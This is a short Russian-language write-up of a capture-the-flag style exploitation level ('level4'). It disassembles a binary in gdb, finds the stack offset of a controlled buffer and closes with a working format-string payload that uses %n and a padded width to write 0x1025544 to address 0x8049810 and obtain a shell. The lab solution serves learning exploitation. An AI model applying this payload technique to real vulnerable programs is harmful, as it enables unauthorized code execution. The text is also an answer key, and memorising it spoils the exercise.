смотрим, где мы оказались и что у нас есть
    ls
    level4

при вызове скрипта, можно вывести значения из стэка
    ./level4
    %d %x %p
с помощью ltrace посмотрим используемые функции,
в данном случае используется fgets, а это уже защищенная функция
также используется printf

посмотрим внутрь файла с помощью gdb
в функции main вызывается функция n, а внутри n вызывается p
    ...
    0x08048488 <+49>:	call   0x8048444 <p>
    0x0804848d <+54>:	mov    0x8049810,%eax
    0x08048492 <+59>:	cmp    $0x1025544,%eax
    0x08048497 <+64>:	jne    0x80484a5 <n+78>
    ...

в данном месте происходит присваивание значения переменной по адресу 0x8049810 и сравнение со значением $0x1025544, в случае успеха откроется sh
нам нужно записать значение $0x1025544 (16930116) по адресу 0x8049810
задача аналогичная предыдущему уровню, однако здесь буфер используется в двух функциях

найдем, в каком месте нужный нас адрес:
    python -c "print '\x10\x98\x04\x08 %x %x %x %x %x %x %x %x %x %x %x %x'" > /tmp/level4
    cat /tmp/level4 | ./level4
     b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 8049810

искомое место -б 2
с помощью модификатора printf %n можно заменить значение переменной по адресу
единственная проблема в том, что значение 16930116 слишком большое
нужно использовать модификатор %d, который позволяет динамически изменять ширину
    python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/level4
    cat /tmp/level4 - | ./level4